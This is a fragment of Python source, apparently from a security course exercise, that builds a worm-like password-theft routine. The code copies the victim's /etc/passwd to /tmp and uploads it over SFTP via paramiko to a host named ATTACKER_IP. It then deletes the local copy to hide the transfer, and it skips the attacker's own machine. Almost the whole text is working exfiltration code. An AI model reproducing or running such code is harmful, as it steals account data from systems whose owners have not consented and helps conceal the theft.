...
def passwordThief():
	...
	sshHacker = paramiko.SSHClient()
	# Set some parameters to make things easier.
	sshHacker.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	#connect to hacker
	sshHacker.connect(ATTACKER_IP, username="cpsc", password="cpsc")
	#open ssh to hacker ip
	sftp_to_hacker = sshHacker.open_sftp()
	#send system password files to hacker
	sftp_to_hacker.put("/tmp/"+password_filename,"/tmp/"+password_filename)
	call(["rm","/tmp/"+password_filename])
...
if not getMyIP() == ATTACKER_IP:
	...
	myIP = getMyIP()
	password_filename = "file_" + myIP
	call(["touch","/tmp/" + password_filename])
	call(["cp","/etc/passwd","/tmp/"+password_filename])

	#send targets /etc/passwd -> hacker via ssh
	passwordThief()
